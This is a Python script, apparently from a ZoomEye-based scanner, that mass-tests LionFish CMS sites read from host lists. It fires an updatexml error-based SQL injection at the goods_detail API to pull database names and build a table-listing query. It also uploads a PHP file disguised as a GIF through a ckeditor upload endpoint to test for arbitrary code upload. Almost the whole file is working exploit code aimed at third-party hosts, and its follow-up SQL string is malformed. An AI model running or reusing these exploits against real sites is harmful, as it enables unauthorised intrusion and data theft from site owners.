import requests, os, re
from zoomeye_scan.lib.get_user_agent import get_user_agent
from requests.packages import urllib3

urllib3.disable_warnings()

def sqli():
    vunl_path = "/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)"
    for x in os.listdir('../webscan/lionfishcms'):
        file_data = 'webscan/lionfishcms' + '/' + x
        z = re.findall("webscan/lionfishcms/(.+?).txt", file_data)
        # print(z)
        if z != [] and z[0] in file_data:
            with open('../{0}'.format(file_data), 'r') as file:
                urls = file.readlines()
                for i in urls:
                    url = i.split("\n")
                    if "http://"  not in url:
                        vunl_url = "http://" + url[0] + vunl_path
                        # print(vunl_url)
                    try:
                        r = requests.get(url=vunl_url, headers=get_user_agent(), verify=False, timeout=5)
                        print("[^]正在测试:", vunl_url)
                        if "syntax" in r.text:
                            print("上诉地址存在SQL注入")
                            database_name = re.findall("General error: 1105 XPATH syntax error: '~(.+?)~'", r.text)
                            sqli_path = "/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,select table_name from information_schema.tables where table_schema='{0}',0x7e),1)".format(
                                database_name[0])
                            sqli_url = "https://" + url[0] + sqli_path
                            print(sqli_url)
                    except Exception as e:
                        try:
                            if "https://" not in url:
                                vunl_url = "https://" + url[0] + vunl_path
                                # print(vunl_url)
                                r = requests.get(url=vunl_url, headers=get_user_agent(), verify=False, timeout=5)
                                print("[^]正在测试:", vunl_url)
                                if "syntax" in r.text:
                                    print("上诉地址存在SQL注入")
                                    database_name = re.findall("General error: 1105 XPATH syntax error: '~(.+?)~'", r.text)
                                    sqli_path = "/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,select table_name from information_schema.tables where table_schema='{0}',0x7e),1)".format(database_name[0])
                                    sqli_url = "https://" + url[0] + sqli_path
                                    print(sqli_url)
                                    # sqli = requests.get(url=url)
                        except Exception as e:
                            print("请求失败！{0}".format(e))
        else:
            print(file_data + "该文件不是.txt文件")


def upload():
    vunl_path = "/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php"
    headers = {
        "Content-Length": "213",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "null",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
    }
    data = '------WebKitFormBoundary8UaANmWAgM4BqBSs\n'
    data += 'Content-Disposition: form-data; name="files"; filename="shenye.php"\n'
    data += 'Content-Type: image/gif\n\n'
    data += "<?php echo('shenye');?>"
    data += '\n\n------WebKitFormBoundary8UaANmWAgM4BqBSs—'

    for x in os.listdir('../webscan/lionfishcms'):
        file_data = 'webscan/lionfishcms' + '/' + x
        z = re.findall("webscan/lionfishcms/(.+?).txt", file_data)
        # print(z)
        if z != [] and z[0] in file_data:
            with open('../{0}'.format(file_data), 'r') as file:
                urls = file.readlines()
                for i in urls:
                    url = i.split("\n")
                    if "http://" not in url:
                        vunl_url = "http://" + url[0] + vunl_path
                        try:
                            r = requests.post(url=vunl_url, headers=headers, data=data.encode('utf-8'), verify=False, timeout=10)
                            r.encoding = 'utf-8'
                            if 'shenye' in r.text and r.status_code == 200:
                                print("{0} 存在文件上传漏洞".format(vunl_url))
                        except Exception as e:
                            if "https://" not in url:
                                vunl_url = "https://" + url[0] + vunl_path
                                try:
                                    r = requests.post(url=vunl_url, headers=headers, data=data.encode('utf-8'), verify=False,
                                                      timeout=10)
                                    r.encoding = 'utf-8'
                                    if 'shenye' in r.text and r.status_code == 200:
                                        print("{0} 存在文件上传漏洞".format(vunl_url))
                                except Exception as e:
                                    print("请求失败！{0}".format(e))

if __name__ == "__main__":
    sqli()